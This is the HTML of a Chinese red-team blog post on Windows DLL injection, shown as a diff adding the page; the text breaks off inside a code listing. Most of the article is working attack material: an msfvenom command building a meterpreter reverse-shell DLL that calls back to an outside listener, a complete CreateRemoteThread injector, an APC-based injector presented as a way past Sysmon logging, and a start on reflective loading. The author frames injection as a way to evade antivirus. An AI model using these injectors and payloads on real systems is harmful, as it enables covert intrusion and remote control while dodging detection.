@@ -1,0 +1,1429 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="cn">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+  
+  
+    
+      
+    
+    
+      
+    
+  <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+  <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-flash.min.css" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic|Monda:300,300italic,400,400italic,700,700italic|Lobster Two:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+  
+
+<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.4.0" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.4.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.4.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.4.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.4.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '6.4.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="承诺是男人给女人的定心丸。吃了安心，虽然这定心丸的药性有待考证，但女人都希望吃了再说。  文章首发云众可信，博客备份。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DLL injection">
+<meta property="og:url" content="https://lengjibo.github.io/DLLinjection/index.html">
+<meta property="og:site_name" content="冷逸的个人博客|开往安河桥北~">
+<meta property="og:description" content="承诺是男人给女人的定心丸。吃了安心，虽然这定心丸的药性有待考证，但女人都希望吃了再说。  文章首发云众可信，博客备份。">
+<meta property="og:locale" content="cn">
+<meta property="og:image" content="https://lengjibo.github.io/images/DLLInjection/0.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/DLLInjection/1.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/DLLInjection/2.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/DLLInjection/3.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/DLLInjection/4.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/DLLInjection/5.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/DLLInjection/6.png">
+<meta property="og:updated_time" content="2020-05-14T07:46:57.116Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="DLL injection">
+<meta name="twitter:description" content="承诺是男人给女人的定心丸。吃了安心，虽然这定心丸的药性有待考证，但女人都希望吃了再说。  文章首发云众可信，博客备份。">
+<meta name="twitter:image" content="https://lengjibo.github.io/images/DLLInjection/0.png">
+
+
+
+  <link rel="alternate" href="/../../.deploy_git/atom.xml" title="冷逸的个人博客|开往安河桥北~" type="application/atom+xml" />
+
+
+
+
+  <link rel="canonical" href="https://lengjibo.github.io/DLLinjection/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>DLL injection | 冷逸的个人博客|开往安河桥北~</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="cn">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">冷逸的个人博客|开往安河桥北~</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Startseite</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />Über</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />Kategorien</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Archiv</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-book">
+    <a href="/book/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-book"></i> <br />book</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://lengjibo.github.io/DLLinjection/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="冷逸">
+      <meta itemprop="description" content="做一个温柔的人...">
+      <meta itemprop="image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g7vony4ltaj308w08wq30.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="冷逸的个人博客|开往安河桥北~">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">DLL injection
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+
+              
+                
+              
+
+              <time title="Post created: 2020-05-14 15:44:00 / Updated at: 15:46:57" itemprop="dateCreated datePublished" datetime="2020-05-14T15:44:00+08:00">2020-05-14</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">in</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/RedTeam/" itemprop="url" rel="index"><span itemprop="name">RedTeam</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon"
+            >
+            <i class="fa fa-eye"></i>
+             Views:  
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>承诺是男人给女人的定心丸。吃了安心，虽然这定心丸的药性有待考证，但女人都希望吃了再说。</p>
+<hr>
+<p>文章首发云众可信，博客备份。</p>
+<a id="more"></a>
+<h2 id="什么是dll注入"><a href="#什么是dll注入" class="headerlink" title="什么是dll注入"></a>什么是dll注入</h2><p>在Windows操作系统中，运行的每一个进程都生活在自己的程序空间中（保护模式），每一个进程都认为自己拥有整个机器的控制权，每个进程都认为自己拥有计算机的整个内存空间，这些假象都是操作系统创造的（操作系统控制CPU使得CPU启用保护模式）。理论上而言，运行在操作系统上的每一个进程之间都是互不干扰的，即每个进程都会拥有独立的地址空间。比如说进程B修改了地址为0x4000000的数据，那么进程C的地址为0x4000000处的数据并未随着B的修改而发生改变，并且进程C可能并不拥有地址为0x4000000的内存(操作系统可能没有为进程C映射这块内存)。因此，如果某进程有一个缺陷覆盖了随机地址处的内存(这可能导致程序运行出现问题)，那么这个缺陷并不会影响到其他进程所使用的内存。<br>　　也正是由于进程的地址空间是独立的（保护模式），因此我们很难编写能够与其它进程通信或控制其它进程的应用程序。<br>　　所谓的dll注入即是让程序A强行加载程序B给定的a.dll，并执行程序B给定的a.dll里面的代码。注意，程序B所给定的a.dll原先并不会被程序A主动加载，但是当程序B通过某种手段让程序A“加载”a.dll后，程序A将会执行a.dll里的代码，此时，a.dll就进入了程序A的地址空间，而a.dll模块的程序逻辑由程序B的开发者设计，因此程序B的开发者可以对程序A为所欲为。因为执行命令需要借用某些合法进程，所以一般的进程注入都要绕过AV检测。</p>
+<h3 id="dll注入实现过程"><a href="#dll注入实现过程" class="headerlink" title="dll注入实现过程"></a>dll注入实现过程</h3><p><img src="../images/DLLInjection/0.png" alt="0.png">)</p>
+<p>即<br>       1.附加到目标/远程进程<br>       2.在目标/远程进程内分配内存<br>       3.将DLL文件路径，或者DLL文件，复制到目标/远程进程的内存空间<br>       4.控制进程运行DLL文件</p>
+<p>主要用到的几个函数：</p>
+<p><strong>OpenProcess ：</strong></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">OpenProcess</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwDesiredAccess,</span></span></span><br><span class="line"><span class="function"><span class="params">  BOOL  bInheritHandle,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwProcessId</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
+<p><strong>VirtualAllocEx：</strong><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LPVOID <span class="title">VirtualAllocEx</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hProcess,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPVOID lpAddress,</span></span></span><br><span class="line"><span class="function"><span class="params">  SIZE_T dwSize,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD  flAllocationType,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD  flProtect</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure></p>
+<p><strong>WriteProcessMemory：</strong></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">WriteProcessMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE  hProcess,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPVOID  lpBaseAddress,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCVOID lpBuffer,</span></span></span><br><span class="line"><span class="function"><span class="params">  SIZE_T  nSize,</span></span></span><br><span class="line"><span class="function"><span class="params">  SIZE_T  *lpNumberOfBytesWritten</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
+<p><strong>CreateRemoteThread：</strong></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateRemoteThread</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE                 hProcess,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPSECURITY_ATTRIBUTES  lpThreadAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">  SIZE_T                 dwStackSize,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPVOID                 lpParameter,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD                  dwCreationFlags,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD                lpThreadId</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
+<h3 id="dll注入demo："><a href="#dll注入demo：" class="headerlink" title="dll注入demo："></a>dll注入demo：</h3><p>既然是dll注入，那么我们肯定需要一个dll，我们使用msf直接生成一个dll出来：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.105 LPORT=4444 -f dll -o inject.dll</span><br></pre></td></tr></table></figure>
+<p>然后手写一个dll注入器：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span>&amp;lt;Windows.h&amp;gt;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span>&amp;lt;stdio.h&amp;gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> * argv[])</span> </span>&#123;</span><br><span class="line">	HANDLE ProcessHandle;</span><br><span class="line">	LPVOID remotebuffer;</span><br><span class="line">	BOOL write;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">wchar_t</span> dllpath[] = TEXT(<span class="string">"C:\\users\\root\\desktop\\inject.dll"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (argc &amp;lt; <span class="number">2</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Useage inject.exe Pid;\n"</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"such as inject.exe 258\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Injecting DLL to PID: %i\n"</span>, atoi(argv[<span class="number">1</span>]));</span><br><span class="line">	ProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[<span class="number">1</span>])));</span><br><span class="line">	<span class="keyword">if</span> (ProcessHandle == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"OpenProcess Fail !!!"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"OpenProcess %i successful !!!\n"</span>,atoi(argv[<span class="number">1</span>]));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	remotebuffer = VirtualAllocEx(ProcessHandle, <span class="literal">NULL</span>, <span class="keyword">sizeof</span> dllpath, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">	write = WriteProcessMemory(ProcessHandle, remotebuffer, (LPVOID)dllpath, <span class="keyword">sizeof</span> dllpath, <span class="literal">NULL</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (write == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"WriteProcessMemory Fail %i!!!"</span>,GetLastError());</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"WriteProcessMemory  successful !!!\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT(<span class="string">"Kernel32"</span>)), <span class="string">"LoadLibraryW"</span>);</span><br><span class="line">	CreateRemoteThread(ProcessHandle, <span class="literal">NULL</span>, <span class="number">0</span>, threatStartRoutineAddress, remotebuffer, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	CloseHandle(ProcessHandle);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="../images/DLLInjection/1.png" alt="1.png"></p>
+<p>在进程监控中，也可以清楚的看到进程被注入了dll。</p>
+<p><img src="../images/DLLInjection/2.png" alt="2.png"></p>
+<p>这样我们就实现了一个简单的dll注入的例子。CreateRemoteThread()实现dll注入，是最基础的例子，我们再来看一下其他的dll注入的方法。</p>
+<h3 id="demo2"><a href="#demo2" class="headerlink" title="demo2:"></a>demo2:</h3><p>我们这次使用一个比较小众的方法来进行dll注入，NtCreateThreadEx。</p>
+<p>因为在上面的注入方式中，我们使用了CreateRemoteThread来进行dll注入，而这个方式在具有Sysmon的系统中会留下Event ID 8的痕迹。而我们使用通过APC实现Dll注入则可以绕过这种监控。</p>
+<p>这里有三好学生师傅的demo</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> &amp;lt;windows.h&amp;gt;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> &amp;lt;TlHelp32.h&amp;gt;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> &amp;lt;vector&amp;gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">vector</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">FindProcess</span><span class="params">(PCWSTR exeName, DWORD&amp; pid, <span class="built_in">vector</span>&amp;lt;DWORD&amp;gt;&amp; tids)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> hSnapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (hSnapshot == INVALID_HANDLE_VALUE)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    pid = <span class="number">0</span>;</span><br><span class="line">    PROCESSENTRY32 pe = &#123; <span class="keyword">sizeof</span>(pe) &#125;;</span><br><span class="line">    <span class="keyword">if</span> (::Process32First(hSnapshot, &amp;pe)) &#123;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (_wcsicmp(pe.szExeFile, exeName) == <span class="number">0</span>) &#123;</span><br><span class="line">                pid = pe.th32ProcessID;</span><br><span class="line">                THREADENTRY32 te = &#123; <span class="keyword">sizeof</span>(te) &#125;;</span><br><span class="line">                <span class="keyword">if</span> (::Thread32First(hSnapshot, &amp;te)) &#123;</span><br><span class="line">                    <span class="keyword">do</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (te.th32OwnerProcessID == pid) &#123;</span><br><span class="line">                            tids.push_back(te.th32ThreadID);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">while</span> (::Thread32Next(hSnapshot, &amp;te));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> (::Process32Next(hSnapshot, &amp;pe));</span><br><span class="line">    &#125;</span><br><span class="line">    ::CloseHandle(hSnapshot);</span><br><span class="line">    <span class="keyword">return</span> pid &amp;gt; <span class="number">0</span> &amp;&amp; !tids.empty();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD pid;</span><br><span class="line">	<span class="built_in">vector</span>&amp;lt;DWORD&amp;gt; tids;</span><br><span class="line">	<span class="keyword">if</span> (FindProcess(<span class="string">L"calc.exe"</span>, pid, tids)) </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"OpenProcess\n"</span>);</span><br><span class="line">		HANDLE hProcess = ::OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, pid);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"VirtualAllocEx\n"</span>);</span><br><span class="line">		<span class="keyword">auto</span> p = ::VirtualAllocEx(hProcess, <span class="literal">nullptr</span>, <span class="number">1</span> &amp;lt;&amp;lt; <span class="number">12</span>, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line">		<span class="keyword">wchar_t</span> buffer[] = <span class="string">L"c:\\test\\testdll.dll"</span>;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"WriteProcessMemory\n"</span>);</span><br><span class="line">		::WriteProcessMemory(hProcess, p, buffer, <span class="keyword">sizeof</span>(buffer), <span class="literal">nullptr</span>);</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">auto</span>&amp; tid : tids) </span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"OpenThread\n"</span>);</span><br><span class="line">			HANDLE hThread = ::OpenThread(THREAD_SET_CONTEXT, FALSE, tid);</span><br><span class="line">			<span class="keyword">if</span> (hThread) </span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"GetProcAddress\n"</span>);</span><br><span class="line">				::QueueUserAPC((PAPCFUNC)::GetProcAddress(GetModuleHandle(<span class="string">L"kernel32"</span>), <span class="string">"LoadLibraryW"</span>), hThread, (ULONG_PTR)p);	</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"VirtualFreeEx\n"</span>);</span><br><span class="line">		::VirtualFreeEx(hProcess, p, <span class="number">0</span>, MEM_RELEASE | MEM_DECOMMIT);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>而且还有了C#版本，这里就不再赘述了。</p>
+<h3 id="反射型dll注入："><a href="#反射型dll注入：" class="headerlink" title="反射型dll注入："></a>反射型dll注入：</h3><p>反射DLL注入可以将加密的DLL保存在磁盘（或者以其他形式如shellcode等），之后将其解密放在内存中。之后跟DLL注入一般，使用VirtualAlloc和WriteProcessMemory将DLL写入目标进程。因为没有使用LoadLibrary函数，要想实现DLL的加载运行，我们需要在DLL中添加一个导出函数，ReflectiveLoader，这个函数实现的功能就是加载自身。</p>
+<p>反射DLL注入实现起来其实十分复杂，需要对PE加载十分了解。通过编写ReflectiveLoader找到DLL文件在内存中的地址，分配装载DLL的空间，并计算 DLL 中用于执行反射加载的导出的内存偏移量，然后通过偏移地址作为入口调用 CreateRemoteThread函数执行。</p>
+<p>msf已经有了相应的模块：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">windows/manage/reflective_dll_inject</span><br></pre></td></tr></table></figure>
+<p><img src="../images/DLLInjection/3.png" alt="3.png"></p>
+<p>cs中也可以使用bdllspawn来加载dll实现同样的效果。</p>
+<p>我们也可以手动使用MemoryModule来实现</p>
+<ol>
+<li>将要加载的PE文件读入内存</li>
+<li>初始化MemoryModule句柄</li>
+<li>装载内存</li>
+<li>获得导出函数地址</li>
+<li>执行导出函数</li>
+<li>释放MemoryModule句柄</li>
+</ol>
+<p>代码如下：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 